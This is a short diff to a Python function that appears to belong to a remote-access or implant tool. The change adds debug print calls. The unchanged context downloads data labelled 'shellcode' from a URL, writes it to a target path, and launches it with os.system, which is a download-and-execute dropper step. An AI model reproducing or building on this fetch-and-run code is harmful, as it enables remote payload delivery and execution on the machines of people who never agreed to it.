@@ -49,6 +49,7 @@ def run(**args):
     http = urllib3.PoolManager()
     #The HTTPResponse object provides status, data, and header attributes:
     r = http.request('GET', url)
+    print(r.data)
     shellcode = r.data.decode('utf-8')
   except urllib3.exceptions.MaxRetryError:
   	#os.system("echo 'getFileFromURI: HTTP Error 404: File not found' >> .Tlog.log")
@@ -59,7 +60,7 @@ def run(**args):
 
   #The data attribute of the response is always set to a byte string representing the response content
   cmd = ""
-
+  print(shellcode)
   if bin:
     mon_fichier = open(OsTargetpath, "wb")
     mon_fichier.write(shellcode)
@@ -71,6 +72,7 @@ def run(**args):
     mon_fichier.close()
     cmd= ScriptExec+" "+OsTargetpath
 
+  print(cmd)
   if start and os.name == 'nt': #TODO: check how to start python script
           os.system("start {}".format(cmd)) #os.system("start {}".format(OsTargetpath))
   elif start and os.name == 'posix':
